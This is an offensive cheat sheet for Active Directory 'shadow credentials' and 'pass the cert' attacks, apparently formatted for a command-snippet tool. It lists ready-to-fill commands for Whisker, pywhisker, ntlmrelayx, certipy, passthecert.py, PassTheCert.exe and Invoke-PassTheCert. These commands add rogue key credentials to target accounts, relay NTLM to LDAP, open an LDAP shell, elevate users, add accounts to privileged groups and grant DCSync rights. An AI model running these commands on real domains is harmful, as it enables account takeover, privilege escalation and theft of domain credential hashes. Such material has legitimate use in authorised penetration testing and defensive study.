# Pass The Cert / Whisker

## Whisker

### List shadow credentials

List shadow credentials with Pass The Cert / Whisker.

```powershell title:"Pass the Cert / Whisker List Shadow Credentials"
.\Whisker.exe list /target:"$target_samname" /domain:"$domain" /dc:"$dc_name"
```
<!-- cheat
var target_samname
var domain
var dc_name
-->

### Add shadow credentials

Add shadow credentials with Pass The Cert / Whisker.

```powershell title:"Pass the Cert / Whisker Add Shadow Credentials"
.\Whisker.exe add /target:"$target_samname" /domain:"$domain" /dc:"$dc_name" /path:"$pfx_file" /password:"$pfx_pass"
```
<!-- cheat
var target_samname
var domain
var dc_name
var pfx_file
var pfx_pass
-->

### Remove shadow credential

Remove shadow credential with Pass The Cert / Whisker.

```powershell title:"Pass the Cert / Whisker Remove Shadow Credential"
.\Whisker.exe remove /target:"$target_samname" /domain:"$domain" /dc:"$dc_name" /remove:"$device_id"
```
<!-- cheat
var target_samname
var domain
var dc_name
var device_id
-->

## pywhisker

### List shadow credentials 2

List shadow credentials 2 with Pass The Cert / Whisker.

```sh title:"Pass the Cert / Whisker List Shadow Credentials 2"
pywhisker.py -d "$domain" -u "$user" -p "$pass" --target "$target_samname" --action list
```
<!-- cheat
var domain
var user
var pass
var target_samname
-->

### Add shadow credentials 2

Add shadow credentials 2 with Pass The Cert / Whisker.

```sh title:"Pass the Cert / Whisker Add Shadow Credentials 2"
pywhisker.py -d "$domain" -u "$user" -p "$pass" --target "$target_samname" --action add --filename "$output_name"
```
<!-- cheat
var domain
var user
var pass
var target_samname
var output_name
-->

### Remove shadow credential 2

Remove shadow credential 2 with Pass The Cert / Whisker.

```sh title:"Pass the Cert / Whisker Remove Shadow Credential 2"
pywhisker.py -d "$domain" -u "$user" -p "$pass" --target "$target_samname" --action remove --device-id "$device_id"
```
<!-- cheat
var domain
var user
var pass
var target_samname
var device_id
-->

### Relay shadow credentials

Dump relay shadow credentials with Pass The Cert / Whisker.

```sh title:"Pass the Cert / Whisker Dump Relay Shadow Credentials"
ntlmrelayx.py -t "ldap://$dc_fqdn" --shadow-credentials --shadow-target "$target_samname"
```
<!-- cheat
var dc_fqdn
var target_samname
-->

## passthecert.py

### Extract cert from PFX

Extract cert from PFX with Pass The Cert / Whisker.

```sh title:"Pass the Cert / Whisker Extract Cert from PFX"
certipy cert -pfx "$pfx_file" -nokey -out "$cert_file"
```
<!-- cheat
var pfx_file
var cert_file
-->

### Extract key from PFX

Extract key from PFX with Pass The Cert / Whisker.

```sh title:"Pass the Cert / Whisker Extract Key from PFX"
certipy cert -pfx "$pfx_file" -nocert -out "$key_file"
```
<!-- cheat
var pfx_file
var key_file
-->

### LDAP shell

Spawn LDAP shell with Pass The Cert / Whisker.

```sh title:"Pass the Cert / Whisker Spawn LDAP Shell"
passthecert.py -action ldap-shell -crt "$cert_file" -key "$key_file" -domain "$domain" -dc-ip "$rhost_ip"
```
<!-- cheat
import domain_ip
var cert_file
var key_file
var domain
-->

### Elevate user

Run elevate user with Pass The Cert / Whisker.

```sh title:"Pass the Cert / Whisker Run Elevate User"
passthecert.py -action modify_user -crt "$cert_file" -key "$key_file" -domain "$domain" -dc-ip "$rhost_ip" -target "$target_samname" -elevate
```
<!-- cheat
import domain_ip
var cert_file
var key_file
var domain
var target_samname
-->

## PassTheCert.exe

### Add account to group

Add account to group with Pass The Cert / Whisker.

```powershell title:"Pass the Cert / Whisker Add Account to Group"
.\PassTheCert.exe --server "$dc_fqdn" --cert-path "$pfx_file" --add-account-to-group --target "$target_group_dn" --account "$target_user_dn"
```
<!-- cheat
var dc_fqdn
var pfx_file
var target_group_dn
var target_user_dn
-->

## Invoke-PassTheCert

### Import module

Run import module with Pass The Cert / Whisker.

```powershell title:"Pass the Cert / Whisker Run Import Module"
Import-Module .\Invoke-PassTheCert.ps1
```
<!-- cheat -->

### Create LDAP connection

Create LDAP connection with Pass The Cert / Whisker.

```powershell title:"Pass the Cert / Whisker Create LDAP Connection"
$ldap = Invoke-PassTheCert-GetLDAPConnectionInstance -Server "$rhost_ip" -Port 636 -Certificate "$pfx_file"
```
<!-- cheat
import domain_ip
var pfx_file
-->

### Add group member

Add group member with Pass The Cert / Whisker.

```powershell title:"Pass the Cert / Whisker Add Group Member"
Invoke-PassTheCert -Action AddGroupMember -LdapConnection $ldap -Identity "$target_user_dn" -GroupDN "$target_group_dn"
```
<!-- cheat
var target_user_dn
var target_group_dn
var ldap
-->

### Grant DCSync

Run grant DCSync with Pass The Cert / Whisker.

```powershell title:"Pass the Cert / Whisker Run Grant DCSync"
Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $ldap -Exploit 'DCSync' -Identity "$controlled_user_dn" -Target "$domain_dn"
```
<!-- cheat
var controlled_user_dn
var domain_dn
var ldap
-->
